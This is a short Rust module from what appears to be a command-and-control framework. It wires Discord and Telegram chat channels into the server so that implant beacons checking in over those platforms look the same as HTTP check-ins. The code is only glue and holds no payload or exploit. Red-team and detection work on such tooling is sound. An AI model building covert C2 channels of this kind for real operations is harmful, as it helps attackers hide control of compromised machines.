//! Server-side Discord/Telegram C2 channels for the standalone C2 binary.
//!
//! The carrier, loop and platform adapters live in `nw-profile::chat_channel`
//! so the portal and this binary cannot drift. This module only binds the
//! shared machinery to this binary's `ServerState`.

use std::sync::Arc;

use nw_profile::chat_channel::FrameHandler;

use crate::server::ServerState;

/// Run the shared C2 pipeline for a chat-channel frame, so a beacon checking in
/// over Discord/Telegram is indistinguishable from one checking in over HTTP.
pub fn frame_handler(state: ServerState) -> FrameHandler {
    Arc::new(move |sealed: &[u8]| {
        // The boxed future must be 'static, so it owns its copy of the state
        // and the frame rather than borrowing the caller's.
        let state = state.clone();
        let sealed = sealed.to_vec();
        Box::pin(async move {
            crate::channels::process_sealed(&state, &sealed)
                .await
                .map_err(|_| "chat channel frame rejected".to_string())
        })
    })
}
